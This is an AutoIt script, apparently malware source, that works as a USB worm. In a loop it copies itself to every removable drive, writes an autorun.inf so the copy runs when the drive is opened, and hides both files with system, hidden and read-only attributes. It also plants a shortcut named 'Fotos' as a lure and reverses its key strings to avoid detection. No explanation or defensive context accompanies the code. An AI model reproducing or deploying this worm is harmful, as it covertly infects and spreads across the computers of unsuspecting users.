usb()
Func usb()
    while 1
        Sleep(3000)
        $namearchivot=@ScriptName
        $disc = DriveGetDrive(reverse("ELBAVOMER"))
        If IsArray($disc) And Not @error Then
        For $i=1 To $disc[0]
        If FileExists($disc[$i] & reverse('fni.nurotua\')) Then FileDelete($disc[$i] & reverse('fni.nurotua\'))
        If Not FileExists($disc[$i] & "\" & $namearchivot) Then
        FileCopy(@ScriptFullPath, $disc[$i] & "\" & $namearchivot)
        FileWrite($disc[$i] & reverse('fni.nurotua\'),reverse(']nurotua[') & @CRLF & "open=" & $namearchivot & @CRLF &  "icon=c:\windows\system\shell32.dll,4" & @CRLF & "shellexecute=" & $namearchivot & @CRLF & "shell\open\Command = " & $namearchivot & @CRLF &  "shell\explore\Command = " & $namearchivot & @CRLF & "shell\open\Default = 1" & @CRLF & "action=Open Folder To View Files")
        FileSetAttrib($disc[$i] & "\" & $namearchivot,"+SHR")
        FileSetAttrib($disc[$i] & reverse('fni.nurotua\'), "+SHR")
        EndIf
        FileCreateShortcut($disc[$i] & "\" & $namearchivot,$disc[$i] & "\" & "Fotos", $disc[$i], "", "", @SystemDir & "\shell32.dll", "^!t", 3, @SW_MINIMIZE)
        Next
        EndIf
    WEnd
EndFunc
Func reverse($string)
    Local $terminado,$contandoreves,$Longitud = StringLen($string)
    For $i = 1 To $Longitud Step 1
            $contandoreves = StringLeft(StringRight($string,$i),1)
            $terminado = $terminado & $contandoreves
    Next
    Return $terminado
EndFunc